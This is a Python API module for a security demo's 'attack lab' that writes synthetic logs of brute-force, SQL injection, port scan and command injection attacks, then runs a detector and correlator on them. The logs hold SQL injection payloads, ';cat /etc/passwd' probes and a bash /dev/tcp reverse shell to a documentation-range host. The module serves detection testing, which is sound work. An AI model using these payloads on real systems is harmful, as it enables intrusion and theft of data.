"""Attack Lab: simulate a simple attack as the raw logs a real server would write, detect it, correlate it.

  POST /api/attack-lab/run       generate logs -> detection.analyze_lines -> SecurityEvents -> CorrelationEngine
  POST /api/attack-lab/analyze   paste your own log lines; detection only, nothing stored
  GET  /api/attack-lab/playbooks the attacks we can simulate
  GET  /api/attack-lab/rules     the detection rulebook (exact logic and thresholds)

Everything generated here is synthetic text written in-process. No packet is sent anywhere. Attacker addresses are
from the documentation ranges (203.0.113.0/24, 198.51.100.0/24, 192.0.2.0/24) and can never be real hosts.
"""
import hashlib
import random
import uuid
from datetime import datetime, timedelta, timezone
from typing import Annotated, Any, Literal
from urllib.parse import quote

from fastapi import APIRouter, Depends, HTTPException
from pydantic import BaseModel, Field
from sqlalchemy.orm import Session

from . import detection
from .asset_store import get_asset_store
from .contracts import Asset, SecurityEvent
from .correlator import CorrelationEngine
from .database import get_db

router = APIRouter()
IST = timezone(timedelta(hours=5, minutes=30))
Scenario = Literal["brute_force", "sql_injection", "port_scan", "command_injection", "normal_traffic"]


class Ctx:
    """Everything a playbook needs to write believable log lines for one target asset."""

    def __init__(self, asset: Asset, succeed: bool, seed: str):
        self.asset, self.host, self.succeed = asset, asset.hostname, succeed
        self.rng = random.Random(seed)
        h = int(hashlib.sha1(asset.asset_id.encode()).hexdigest(), 16)
        self.ip = f"10.{20 + h % 40}.{h // 40 % 250}.{10 + h // 10000 % 200}"
        self.t = datetime.now(IST).replace(microsecond=0) - timedelta(minutes=3)

    def tick(self, seconds: float) -> datetime:
        self.t += timedelta(seconds=seconds)
        return self.t

    def syslog(self, prog: str, msg: str, gap: float = 1.0) -> str:
        return f"{self.tick(gap).isoformat()} {self.host} {prog}: {msg}"

    def web(self, src: str, path: str, status: int, size: int, ua: str = "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
            gap: float = 1.0) -> str:
        when = self.tick(gap).strftime("%d/%b/%Y:%H:%M:%S %z")
        return f'{src} - - [{when}] "GET {path} HTTP/1.1" {status} {size} "-" "{ua}"'


def step(title: str, detail: str, lines: list[str], actor: str = "attacker") -> dict:
    return {"title": title, "detail": detail, "actor": actor, "lines": lines}


# --- playbooks -----------------------------------------------------------------------------------------

def brute_force(c: Ctx) -> list[dict]:
    atk, staff = "203.0.113.45", f"10.{c.rng.randint(1, 9)}.4.21"
    normal = [c.syslog("sshd[1840]", f"Failed password for priya from {staff} port 50112 ssh2", 40),
              c.syslog("sshd[1840]", f"Accepted password for priya from {staff} port 50112 ssh2", 6)]
    tries = []
    for i in range(36):
        user = "root" if i % 4 == 3 else "admin"
        tries.append(c.syslog(f"sshd[{2200 + i}]", f"Failed password for {user} from {atk} port {c.rng.randint(40000, 60999)} ssh2",
                              1.0 + c.rng.random() * 0.5 if i else 20))
    steps = [step("Normal use", "A staff member mistypes her password once, then logs in. This must NOT be flagged.",
                  normal, "staff"),
             step("Automated password guessing",
                  f"Attacker {atk} runs a guessing tool (Hydra-style) against the login: 36 common passwords for "
                  "'admin' and 'root' in under a minute.", tries)]
    if c.succeed:
        steps.append(step("A guess works", "The password for 'admin' was weak. The attacker is now logged in as admin.",
                          [c.syslog("sshd[2240]", f"Accepted password for admin from {atk} port 41877 ssh2", 2)]))
    else:
        steps.append(step("Attacker gives up", "No guess worked. The account was not compromised.", []))
    return steps


def sql_injection(c: Ctx) -> list[dict]:
    atk, tool = "203.0.113.77", "sqlmap/1.8.4#stable (https://sqlmap.org)"
    page = "/netbanking/statement?acct="

    def inj(payload: str) -> str:
        return page + quote("1002" + payload, safe="")

    customers = [c.web("192.0.2.14", "/netbanking/login", 200, 3120, gap=30),
                 c.web("192.0.2.31", "/netbanking/search?q=" + quote("O'Neil Road branch"), 200, 3954),
                 c.web("192.0.2.14", page + "1002", 200, 4210)]
    browse = [c.web(atk, page + "1002", 200, 4180, gap=20), c.web(atk, page + "1003", 200, 4236)]
    probe = [c.web(atk, inj("'"), 500, 812, tool, 4),
             c.web(atk, inj("' OR '1'='1"), 200, 4180, tool),
             c.web(atk, inj("' AND SLEEP(5)-- -"), 200, 4180, tool, 6)]
    ok = c.succeed
    extract = [c.web(atk, inj("' UNION SELECT NULL,NULL,NULL-- -"), 500, 812, tool),
               c.web(atk, inj("' UNION SELECT table_name,NULL,NULL FROM information_schema.tables-- -"),
                     200 if ok else 403, 21544 if ok else 162, tool),
               c.web(atk, inj("' UNION SELECT username,password_hash,email FROM customers-- -"),
                     200 if ok else 403, 48213 if ok else 162, tool)]
    return [
        step("Normal customers", "Real users log in and search. One search contains an apostrophe (O'Neil) "
             "- a quote alone must NOT be flagged.", customers, "customers"),
        step("Attacker looks around", f"{atk} opens the account statement page like a normal customer.", browse),
        step("Probing for injection", "An automated tool (sqlmap) adds a quote, an always-true condition and a "
             "5-second delay to the account number to see if the database obeys.", probe),
        step("Extracting data" if ok else "Extraction blocked",
             "UNION SELECT is used to list the database tables and then dump usernames and password hashes. "
             + ("The responses are 5-10x larger than a normal page: the data came back."
                if ok else "The web application firewall returns 403: nothing came back."), extract),
    ]


def port_scan(c: Ctx) -> list[dict]:
    atk = "198.51.100.23"
    ports = [21, 22, 23, 25, 53, 80, 110, 111, 135, 139, 143, 443, 445, 993, 995, 1433, 1521, 2049, 3306, 3389,
             5432, 5900, 6379, 8080, 8443, 9200, 11211, 27017]
    open_ports = {80, 443}
    fw = lambda src, p, gap: c.syslog("kernel", f"[FW] IN=eth0 SRC={src} DST={c.ip} PROTO=TCP SPT={c.rng.randint(32768, 60999)} "
                                                f"DPT={p} FLAGS=SYN ACTION={'ACCEPT' if p in open_ports else 'DROP'}", gap)
    normal = [fw(f"192.0.2.{c.rng.randint(10, 200)}", 443, 25 if i == 0 else 4) for i in range(4)]
    scan = [fw(atk, p, 15 if i == 0 else 0.2) for i, p in enumerate(c.rng.sample(ports, len(ports)))]
    grab = [c.web(atk, "/", 200, 5120, "Mozilla/5.0 zgrab/0.x", 3)]
    return [step("Normal visitors", "Visitors connect to the website on port 443 only.", normal, "customers"),
            step("Port sweep", f"{atk} knocks on {len(ports)} different ports in a few seconds to learn which "
                 "services are running (SSH, databases, remote desktop ...).", scan),
            step("Fingerprinting", "It found 80 and 443 open and fetches the home page to identify the software. "
                 "Nothing is exploited yet: this is reconnaissance.", grab)]


def command_injection(c: Ctx) -> list[dict]:
    atk, c2, ua = "203.0.113.99", "198.51.100.7", "curl/8.5.0"
    tool = "/billing/tools/ping?host="
    shell = f"bash -c 'bash -i >& /dev/tcp/{c2}/4444 0>&1'"
    ok = c.succeed
    s, blocked = (200, 403)
    steps = [
        step("Finds a 'test connection' page", "The billing site has a diagnostics page that pings a host you type in.",
             [c.web(atk, tool + "8.8.8.8", 200, 640, ua, 30)]),
        step("Tests if commands run", "Adds ';id' and ';cat /etc/passwd' after the address to see if the server runs them.",
             [c.web(atk, tool + quote("8.8.8.8;id", safe=""), s if ok else blocked, 702 if ok else 162, ua, 5),
              c.web(atk, tool + quote("8.8.8.8;cat /etc/passwd", safe=""), s if ok else blocked, 2210 if ok else 162, ua, 4)]),
        step("Sends a reverse shell", f"Injects a command that makes the server connect back to {c2}:4444 and hand "
             "the attacker a live shell.", [c.web(atk, tool + quote("8.8.8.8;" + shell, safe=""),
                                                  s if ok else blocked, 640 if ok else 162, ua, 6)]),
    ]
    if ok:
        steps += [
            step("Server runs the command", "The PHP process starts a shell. Host process auditing records it.",
                 [c.syslog("auditd[611]", f'type=EXECVE ppid=812 parent=php-fpm pid=4410 exe=/bin/sh cmd="sh -c ping -c1 8.8.8.8;{shell}"', 0),
                  c.syslog("auditd[611]", 'type=EXECVE ppid=4410 parent=sh pid=4411 exe=/bin/bash cmd="bash -i"', 0)]),
            step("Shell calls home", f"The server opens an outbound connection to the attacker at {c2}:4444.",
                 [c.syslog("conntrack[90]", f"NEW tcp src={c.ip} sport=51544 dst={c2} dport=4444 dir=outbound", 1)]),
        ]
    else:
        steps.append(step("Blocked", "The web application firewall rejected every injected request (HTTP 403). "
                          "No process started and no connection went out.", []))
    return steps


def normal_traffic(c: Ctx) -> list[dict]:
    users = [f"192.0.2.{n}" for n in (11, 27, 45, 63, 88)]
    pages = ["/", "/outages?district=Agra", "/outages?district=Kanpur+Nagar", "/search?q=" + quote("O'Neil Road"),
             "/static/map.js", "/api/outages?since=2026-10-31T09:00", "/favicon.ico", "/report?type=no+power&ward=12"]
    web = []
    for i in range(16):
        p = pages[i % len(pages)]
        web.append(c.web(users[i % len(users)], p, 404 if p == "/favicon.ico" else 200,
                         c.rng.randint(1800, 6200), gap=30 if i == 0 else c.rng.randint(2, 9)))
    staff = f"10.{c.rng.randint(1, 9)}.4.22"
    auth = [c.syslog("sshd[1902]", f"Failed password for ravi from {staff} port 50213 ssh2", 5),
            c.syslog("sshd[1902]", f"Failed password for ravi from {staff} port 50213 ssh2", 4),
            c.syslog("sshd[1902]", f"Accepted password for ravi from {staff} port 50213 ssh2", 5)]
    fw = [c.syslog("kernel", f"[FW] IN=eth0 SRC={u} DST={c.ip} PROTO=TCP SPT={c.rng.randint(32768, 60999)} "
                             f"DPT=443 FLAGS=SYN ACTION=ACCEPT", 2) for u in users]
    return [step("Citizens use the portal", "Ordinary page views, a search with an apostrophe and a missing favicon (404).",
                 web, "customers"),
            step("Admin mistypes a password", "Two typos, then a successful login: normal human behaviour.", auth, "staff"),
            step("Normal connections", "HTTPS connections from five visitors.", fw, "customers")]


PLAYBOOKS: dict[str, dict[str, Any]] = {
    "brute_force": {"name": "Brute-force login", "fn": brute_force, "default_target": "GOV-VPN-01",
                    "what": "Guessing passwords over and over until one works.",
                    "outcome_label": "Password is guessed", "log_sources": ["auth"]},
    "sql_injection": {"name": "SQL injection", "fn": sql_injection, "default_target": "BNK-NET-01",
                      "what": "Typing database commands into a web form so the site leaks its database.",
                      "outcome_label": "Data is extracted", "log_sources": ["web access"]},
    "port_scan": {"name": "Port scan", "fn": port_scan, "default_target": "GOV-WEB-01",
                  "what": "Knocking on every network port to map which services are running (reconnaissance).",
                  "outcome_label": None, "log_sources": ["firewall", "web access"]},
    "command_injection": {"name": "Command injection -> reverse shell", "fn": command_injection, "default_target": "WTR-WEB-01",
                          "what": "Sneaking an operating-system command into a web field to take remote control of the server.",
                          "outcome_label": "Server is taken over", "log_sources": ["web access", "process audit", "connection tracking"]},
    "normal_traffic": {"name": "Normal traffic (control)", "fn": normal_traffic, "default_target": "PWR-WEB-01",
                       "what": "Ordinary users, typos and searches. Proves the rules do not fire on normal activity.",
                       "outcome_label": None, "log_sources": ["web access", "auth", "firewall"]},
}


# --- detections -> SecurityEvents for the correlation engine ------------------------------------------

EVENT_TYPE = {"brute_force": "auth", "credential_compromise": "auth", "port_scan": "network",
              "sql_injection": "http", "data_exposure": "http", "command_injection": "http", "http_anomaly": "http",
              "unexpected_process": "process", "outbound_connection": "network"}


def to_events(run_id: str, asset: Asset, detections: list[dict]) -> list[SecurityEvent]:
    events = []
    for i, d in enumerate(detections):
        details: dict[str, Any] = {
            "attack_signal": d["signal"], "attack_type": d["attack_type"], "attack_label": d["label"],
            "detection_reason": d["reason"], "stage": d["stage"], "mitre": [m["id"] for m in d["mitre"]],
            "matched_lines": d["count"], "sample": d["evidence"][0]["raw"] if d["evidence"] else None,
        }
        if d["src_ip"]:
            details["src_ip"] = d["src_ip"]
        if d["signal"] == "outbound_connection":
            details |= {"direction": "outbound", "dest_ip": d["indicators"]["dest_ip"], "dest_port": d["indicators"]["dest_port"]}
        at = d["last_seen"] or d["first_seen"]
        events.append(SecurityEvent(
            event_id=f"LAB-{run_id}-{i + 1:02d}-{d['rule_id']}", asset_id=asset.asset_id,
            timestamp=datetime.fromisoformat(at) if at else datetime.now(timezone.utc),
            event_type=EVENT_TYPE[d["signal"]], source_sensor=f"attack-lab/{d['rule_id']}", details=details,
            is_simulated=True, rule_id=d["rule_id"], confidence=d["confidence"]))
    return events


# --- API ------------------------------------------------------------------------------------------------

class RunRequest(BaseModel):
    scenario: Scenario
    target_asset_id: str | None = None  # default: the playbook's suggested target
    succeed: bool = True  # False = the attack is attempted but blocked / fails


class AnalyzeRequest(BaseModel):
    lines: list[Annotated[str, Field(max_length=4096)]] = Field(min_length=1, max_length=500)  # 422 beyond


@router.get("/api/attack-lab/playbooks", tags=["attack-lab"])
def playbooks() -> list[dict]:
    return [{"scenario": k, **{f: v for f, v in p.items() if f != "fn"}} for k, p in PLAYBOOKS.items()]


@router.get("/api/attack-lab/rules", tags=["attack-lab"])
def rules() -> dict:
    return {"rules": [r | {"mitre": [detection.mitre(t) for t in r["mitre"]]} for r in detection.RULES],
            "signatures": [{"id": s.sig_id, "family": s.family, "technique": s.technique, "pattern": s.pattern.pattern,
                            "strong": s.strong} for s in detection.SIGNATURES],
            "thresholds": detection.CONFIG}


@router.post("/api/attack-lab/analyze", tags=["attack-lab"])
def analyze(body: AnalyzeRequest) -> dict:
    """Run the detector on any log lines you paste. Nothing is stored and no alert is created."""
    return detection.analyze_lines(body.lines)


@router.post("/api/attack-lab/run", tags=["attack-lab"],
             responses={403: {"description": "demo mode only"}, 404: {"description": "unknown asset"}})
def run(body: RunRequest, db: Session = Depends(get_db)) -> dict:
    """Simulate the attack as raw logs, detect it from the text alone, and feed what fired into the correlator."""
    from ai.llm import demo_mode
    if not demo_mode():
        raise HTTPException(403, "the attack lab writes simulated alerts and is only available in DEMO_MODE")
    pb = PLAYBOOKS[body.scenario]
    asset = get_asset_store().get(body.target_asset_id or pb["default_target"])
    if asset is None:
        raise HTTPException(404, f"asset {body.target_asset_id} not found")

    run_id = uuid.uuid4().hex[:8].upper()
    steps = pb["fn"](Ctx(asset, body.succeed or not pb["outcome_label"], run_id))
    lines, n = [], 0
    for s in steps:
        s["line_nos"] = list(range(n + 1, n + 1 + len(s["lines"])))
        n += len(s["lines"])
        lines += s.pop("lines")
    analysis = detection.analyze_lines(lines)

    events = to_events(run_id, asset, analysis["detections"])
    out = CorrelationEngine(db).ingest_events(events) if events else {"created": [], "updated": [], "incidents": []}
    note = ("No rule fired, so nothing was sent to the correlation engine and no incident exists." if not events else
            "Added to an existing incident: same asset within the 15-minute correlation window, so the correlator "
            "treats it as one campaign. Reset demo alerts to start clean." if not out["created"] else
            "New incident created.")
    return {
        "run_id": run_id, "scenario": body.scenario, "name": pb["name"], "is_simulated": True,
        "data_classification": "Simulated attack: synthetic log lines generated in-process; no traffic was sent",
        "target": {"asset_id": asset.asset_id, "hostname": asset.hostname, "role": asset.role, "sector": asset.sector,
                   "criticality": asset.criticality, "internet_facing": asset.internet_facing},
        "succeed": body.succeed if pb["outcome_label"] else None,
        "steps": steps, **analysis,
        "events_sent": [e.model_dump(mode="json") for e in events],
        "correlation": {"created": out["created"], "updated": out["updated"], "note": note,
                        "incidents": [i for i in out["incidents"] if asset.asset_id in i["asset_ids"]]},
    }
